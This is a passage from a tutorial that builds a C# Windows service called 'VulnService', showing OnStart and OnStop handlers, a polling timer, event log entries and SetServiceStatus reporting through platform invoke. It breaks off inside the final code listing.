<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnStart</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnStart.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since a service application is designed to be long-running, it usually polls or monitors the system, which we can set up in the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart" target="_blank" rel="noopener noreffer ">OnStart</a> method. We&rsquo;ll do this because we don&rsquo;t want the system to be blocked; the &lsquo;OnStart&rsquo; method must return to the operating system when the service&rsquo;s operation has begun.</p>
<p>We&rsquo;ll set up a simple polling mechanism by using the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer" target="_blank" rel="noopener noreffer ">System.Timers.Timer</a> component. This timer uses an <a href="https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer.elapsed" target="_blank" rel="noopener noreffer ">Elapsed</a> event at regular intervals, at which time the service can do its monitoring.</p>
<p>Add a <code>using</code> statement to <strong>VulnSevice.cs</strong> for the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.timers" target="_blank" rel="noopener noreffer ">System.Timers</a> namespace:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Timers</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna add the following code in the <code>VulnService.OnStart</code> event to set up the polling mechanism.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// Set up a timer that triggers every minute.</span>
</span></span><span class="line"><span class="cl"><span class="n">Timer</span> <span class="n">timer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Timer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">timer</span><span class="p">.</span><span class="n">Interval</span> <span class="p">=</span> <span class="m">60000</span><span class="p">;</span> <span class="c1">// 60 seconds</span>
</span></span><span class="line"><span class="cl"><span class="n">timer</span><span class="p">.</span><span class="n">Elapsed</span> <span class="p">+=</span> <span class="k">new</span> <span class="n">ElapsedEventHandler</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">OnTimer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">timer</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the <code>VulnService</code> class, we&rsquo;ll add the <code>OnTimer</code> method to handle the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer.elapsed" target="_blank" rel="noopener noreffer ">Timer.Elapsed</a> event:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">void</span> <span class="n">OnTimer</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">ElapsedEventArgs</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// TODO: Insert monitoring activities here.</span>
</span></span><span class="line"><span class="cl">    <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;Monitoring the System&#34;</span><span class="p">,</span> <span class="n">EventLogEntryType</span><span class="p">.</span><span class="n">Information</span><span class="p">,</span> <span class="n">eventId</span><span class="p">++);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the <code>VulnService</code> class, we&rsquo;ll add a member variable that contains the identifier of the next event to write into the event log:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">int</span> <span class="n">eventId</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="service-stop">Service Stop</h3>
<p>Now we&rsquo;re gonna define the event that occurs when the service is stopped. We&rsquo;ll insert a line of code in the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstop" target="_blank" rel="noopener noreffer ">OnStop</a> method which adds an entry to the event log when the service is stopped:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnStop</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnStop.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="general-actions">General Actions</h3>
<p>We&rsquo;re gonna override the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onpause" target="_blank" rel="noopener noreffer ">OnPause</a>, <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.oncontinue" target="_blank" rel="noopener noreffer ">OnContinue</a>, and <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onshutdown" target="_blank" rel="noopener noreffer ">OnShutdown</a> methods to define additional processing for your component. The following code shows how we can override the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.oncontinue" target="_blank" rel="noopener noreffer ">OnContinue</a> method in the <code>VulnService</code> class:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnContinue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnContinue.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="setting-service-status">Setting Service Status</h3>
<p>An essential part of a service is report of its status to the <a href="https://docs.microsoft.com/en-us/windows/desktop/Services/service-control-manager" target="_blank" rel="noopener noreffer ">Service Control Manager</a> this way a user can notice whether a service is functioning correctly. According to the documentation, by default, a service that inherits from <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase" target="_blank" rel="noopener noreffer ">ServiceBase</a> reports a limited set of status settings, which include:</p>
<ul>
<li>SERVICE_STOPPED: When the service stops</li>
<li>SERVICE_PAUSED: When the service is paused</li>
<li>SERVICE_RUNNING: When the service is running</li>
<li>SERVICE_START_PENDING: When the service is pending to start, it can fail.</li>
</ul>
<p>We&rsquo;ll add a <code>using</code> statement to <strong>VulnService.cs</strong> for the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices" target="_blank" rel="noopener noreffer ">System.Runtime.InteropServices</a> namespace:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we&rsquo;re going to add the following code to <strong>VulnService.cs</strong> which it&rsquo;ll declare the <code>ServiceState</code> values and add a structure for the status, which we&rsquo;ll use in a platform invoke call:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">enum</span> <span class="n">ServiceState</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_STOPPED</span> <span class="p">=</span> <span class="m">0x00000001</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_START_PENDING</span> <span class="p">=</span> <span class="m">0x00000002</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_STOP_PENDING</span> <span class="p">=</span> <span class="m">0x00000003</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_RUNNING</span> <span class="p">=</span> <span class="m">0x00000004</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_CONTINUE_PENDING</span> <span class="p">=</span> <span class="m">0x00000005</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_PAUSE_PENDING</span> <span class="p">=</span> <span class="m">0x00000006</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">SERVICE_PAUSED</span> <span class="p">=</span> <span class="m">0x00000007</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">
</span></span></span><span class="line"><span class="cl"><span class="na">[StructLayout(LayoutKind.Sequential)]</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">struct</span> <span class="nc">ServiceStatus</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwServiceType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">ServiceState</span> <span class="n">dwCurrentState</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwControlsAccepted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwWin32ExitCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwServiceSpecificExitCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwCheckPoint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">dwWaitHint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the <code>VulnService</code> class we&rsquo;ll declare the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-setservicestatus" target="_blank" rel="noopener noreffer ">SetServiceStatus</a> function by using <a href="https://docs.microsoft.com/en-us/dotnet/framework/interop/consuming-unmanaged-dll-functions" target="_blank" rel="noopener noreffer ">platform invoke</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="na">[DllImport(&#34;advapi32.dll&#34;, SetLastError = true)]</span>
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="kt">bool</span> <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">IntPtr</span> <span class="n">handle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">ServiceStatus</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;ll implement the SERVICE_START_PENDING status by adding the following code to the <strong>beginning</strong> of the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart" target="_blank" rel="noopener noreffer ">OnStart</a> method:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// Update the service state to Start Pending.</span>
</span></span><span class="line"><span class="cl"><span class="n">ServiceStatus</span> <span class="n">serviceStatus</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ServiceStatus</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="p">=</span> <span class="m">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;ll add this code to the <strong>end</strong> of the <code>OnStart</code> method to set the status to SERVICE_RUNNING:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// Update the service state to Running.</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_RUNNING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Optionally, we&rsquo;ll implement the SERVICE_STOP_PENDING status and return the SERVICE_STOPPED status before the <code>OnStop</code> method exits:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// Update the service state to Stop Pending.</span>
</span></span><span class="line"><span class="cl"><span class="n">ServiceStatus</span> <span class="n">serviceStatus</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ServiceStatus</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="p">=</span> <span class="m">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Update the service state to Stopped.</span>
</span></span><span class="line"><span class="cl"><span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_STOPPED</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>VulnService.cs</code> file ends up looking something like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ComponentModel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ServiceProcess</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Timers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">partial</span> <span class="k">class</span> <span class="nc">VulnService</span> <span class="p">:</span> <span class="n">ServiceBase</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;advapi32.dll&#34;, SetLastError = true)]</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="kt">bool</span> <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">IntPtr</span> <span class="n">handle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">ServiceStatus</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">int</span> <span class="n">eventId</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">VulnService</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">InitializeComponent</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(!</span><span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">.</span><span class="n">SourceExists</span><span class="p">(</span><span class="s">&#34;MySource&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">EventLog</span><span class="p">.</span><span class="n">CreateEventSource</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="s">&#34;MySource&#34;</span><span class="p">,</span> <span class="s">&#34;MyNewLog&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">Source</span> <span class="p">=</span> <span class="s">&#34;MySource&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">Log</span> <span class="p">=</span> <span class="s">&#34;MyNewLog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnStart</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Update the service state to Start Pending.</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServiceStatus</span> <span class="n">serviceStatus</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ServiceStatus</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="p">=</span> <span class="m">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnStart.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Set up a timer that triggers every minute.</span>
</span></span><span class="line"><span class="cl">            <span class="n">Timer</span> <span class="n">timer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Timer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">timer</span><span class="p">.</span><span class="n">Interval</span> <span class="p">=</span> <span class="m">60000</span><span class="p">;</span> <span class="c1">// 60 seconds</span>
</span></span><span class="line"><span class="cl">            <span class="n">timer</span><span class="p">.</span><span class="n">Elapsed</span> <span class="p">+=</span> <span class="k">new</span> <span class="n">ElapsedEventHandler</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">OnTimer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">timer</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Update the service state to Running.</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_RUNNING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">SetServiceStatus</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ServiceHandle</span><span class="p">,</span> <span class="k">ref</span> <span class="n">serviceStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">protected</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">OnStop</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">eventLog1</span><span class="p">.</span><span class="n">WriteEntry</span><span class="p">(</span><span class="s">&#34;In OnStop.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Update the service state to Stop Pending.</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServiceStatus</span> <span class="n">serviceStatus</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ServiceStatus</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="p">=</span> <span class="n">ServiceState</span><span class="p">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">serviceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="p">=</span> <span class="m">100000</span><span class="p">;</span>
